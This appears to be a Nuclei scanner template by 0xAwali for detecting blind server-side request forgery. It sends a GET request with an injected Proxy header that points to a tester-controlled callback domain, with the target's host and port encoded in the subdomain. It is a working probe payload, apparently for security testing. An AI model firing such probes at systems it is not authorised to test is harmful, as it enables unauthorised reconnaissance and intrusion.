id: 0x142

info:
  name: Blind SSRF
  author: 0xAwali
  severity: info

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Cache-Control: no-transform
        Proxy: {{Host}}.{{Port}}.BSSRF-142.{{MY-DOMAIN}}
        Accept-Encoding: gzip, deflate
        Accept: */*
        
    matchers:
      - type: word
        part: body
        words:
          - "Your Match"